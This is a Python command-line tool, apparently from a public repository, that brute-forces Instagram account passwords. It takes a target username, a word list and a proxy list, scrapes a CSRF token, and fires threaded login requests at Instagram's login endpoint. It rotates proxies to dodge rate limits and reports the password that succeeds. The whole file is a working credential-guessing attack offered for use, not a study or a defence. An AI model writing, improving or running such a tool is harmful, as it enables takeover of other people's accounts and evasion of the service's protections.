import urllib.request as rq
import random
import urllib.parse as http_parser
import argparse
import time
import socket
import threading
import traceback

try:
    import Queue
except ImportError:
    import queue as Queue

THREAD = 4




class bcolors:
    HEADER = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'



def craft_response(username, password, csrf_token, proxy):

  user_agents = ["Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko)",
             "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1",
             "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)",
             "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
             "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
             "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))"]

  URL = "https://www.instagram.com/accounts/login/ajax/"


  values = {
    'username': username,
    'enc_password': encode_password(password),
    'Ps': '',
    'queryParams': '{}',
    'optIntoOneTap': 'false'
  }


  headers = {
    "Host": "www.instagram.com",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
    #"User-Agent": random.choice(user_agents),
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "X-CSRFToken": csrf_token,
    "X-Instagram-AJAX": "1",
    "X-IG-WWW-Claim": "0",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "https://www.instagram.com",
    "Referer": "https://www.instagram.com/",
    "Cookie": "csrf_token=" + csrf_token
  }

  if proxy is not None:
    proxy_support = rq.ProxyHandler({'https': 'https://' + proxy})
    opener = rq.build_opener(proxy_support)
    rq.install_opener(opener)

  

  data = http_parser.urlencode(values)
  data = data.encode('ascii')
  req = rq.Request(URL, data, headers)



  with rq.urlopen(req) as response:
    the_page = response.read()

    #print (the_page)

    try:

      if "\"authenticated\": false" in str(the_page):

        print ("Trying: " + "\"" + password + "\"" +"| FAILURE")

      else:
        print ("Success! Password is: " + password)
        exit()

    except Exception as err:
      print("Error: {0}".format(err))

def encode_password(password):

  formatted_time = str(int(time.time()))

  enc_password = '#PWD_INSTAGRAM_BROWSER:0:' + formatted_time + ':' + password

  return enc_password

def is_bad_proxy(pip):    
    try:
        proxy_handler = rq.ProxyHandler({'http': pip})
        opener = rq.build_opener(proxy_handler)
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        rq.install_opener(opener)
        req=rq.Request('http://www.google.com')  # change the URL to test here
        sock=rq.urlopen(req)

    except Exception as err:
        print("Error: {0}".format(err))
        return True
    return False


def check_avalaible_proxys(proxys):
    """
        check avalaible proxyies from proxy_list file
    """
    socket.setdefaulttimeout(30)

    #global proxys_working_list
    print(bcolors.WARNING + "[-] Testing Proxy List...\n" + bcolors.ENDC)

    max_thread = THREAD

    queue = Queue.Queue()
    queuelock = threading.Lock()
    threads = []

    for proxy in proxys:
        queue.put(proxy)

    while not queue.empty():
        queuelock.acquire()
        for workers in range(max_thread):
            t = threading.Thread(target=check_proxy, args=(queue,))
            t.setDaemon(True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        queuelock.release()

    print(bcolors.OKGREEN + "[+] Online Proxy: " + bcolors.BOLD + str(len(proxys_working_list)) + bcolors.ENDC + "\n")

def check_proxy(q):
    """
    check proxy for and append to working proxies
    :param q:
    """

    if not q.empty():

        proxy = q.get(False)
        proxy = proxy.replace("\r", "").replace("\n", "")


        try:
        

            
            
            is_working = False

            if not is_bad_proxy(proxy):
                proxys_working_list.update({proxy: proxy})
                print(bcolors.OKGREEN + " --[+] ", proxy, " | PASS" + bcolors.ENDC)

            else:
                print(" --[!] ", proxy, " | FAILED")
            
            

        except Exception as err:
            print(" --[!] ", proxy, " | FAILED | " + str(err))
            pass  

def brute(q):
    """
    main worker function
    :param word:
    :param event:
    :return:
    """
    if not q.empty():
        try:
            proxy = None

            #print(proxys_working_list)

            if len(proxys_working_list) != 0:
                proxy = random.choice(list(proxys_working_list.keys()))

            word = q.get()
            word = word.replace("\r", "").replace("\n", "")


            password = word.strip()

            craft_response(username, word, csrf_token, proxy)

        except Exception as error:
          print (str(error) + traceback.print_exc())



            
def starter():
    """
    threading workers initialize
    """
    global found_flag

    queue = Queue.Queue()
    threads = []
    max_thread = THREAD
    found_flag = False

    queuelock = threading.Lock()

    print(bcolors.HEADER + "\n[!] Initializing Workers")
    print("[!] Start Cracking ... \n" + bcolors.ENDC)

    try:
        for word in words:
            queue.put(word)
        while not queue.empty():
            queuelock.acquire()
            for workers in range(max_thread):
                t = threading.Thread(target=brute, args=(queue,))
                t.setDaemon(True)
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
            queuelock.release()
            if found_flag:
                break
        print(bcolors.OKGREEN + "\n--------------------")
        print("[!] Brute complete !" + bcolors.ENDC)

    except Exception as err:
        print(err)

def get_csrf():

  try:
    response = rq.urlopen('http://www.instagram.com')
    html = response.read()

    page_text = str(html)

    result = page_text.find("csrf_token")
    after = page_text[result + len("csrf_token"):-1]


    csrf_token = after[:after.find(",")].replace(":", "").replace("\"", "")

    if len(csrf_token) == 0:
      print ("[-] Error extracting CSRF token, exiting...")
      exit()
    else:

      #print ("CSRF token is: " + csrf_token)
      print(bcolors.OKGREEN + "[+] CSRF Token :", csrf_token, "\n" + bcolors.ENDC)
      return csrf_token
  except Exception as e:
    print ("[-] Error extracting CSRF token, exiting...")
    print (str(e))
    exit()

  




if __name__ == "__main__":


  global proxys_working_list
  proxys_working_list = {}
  global username
  global csrf_token

  # Parse args
  parser = argparse.ArgumentParser(
        description="Instagram BruteForce Script",
        epilog="python angel_brute.py -u user_test -w words.txt"
    )

  # required argument
  parser.add_argument('-u', '--username', action="store", required=True,
                  help='Target Username')
  parser.add_argument('-w', '--word', action="store", required=True,
                  help='Words list path')
  parser.add_argument('-p', '--proxy', action="store", required=True,
                        help='Proxy list path')

  args = parser.parse_args()

  USER = args.username
  
  username = USER

  try:
      words = open(args.word).readlines()
  except IOError:
      print("[-] Error: Check your word list file path\n")
      sys.exit(1)

  try:
    proxies = open(args.proxy).readlines()
  except IOError:
      print("[-] Error: Check your proxy list file path\n")
      sys.exit(1)


  csrf_token = get_csrf()
  #check_avalaible_proxys(proxies)
  starter()


  #main(USER, words)




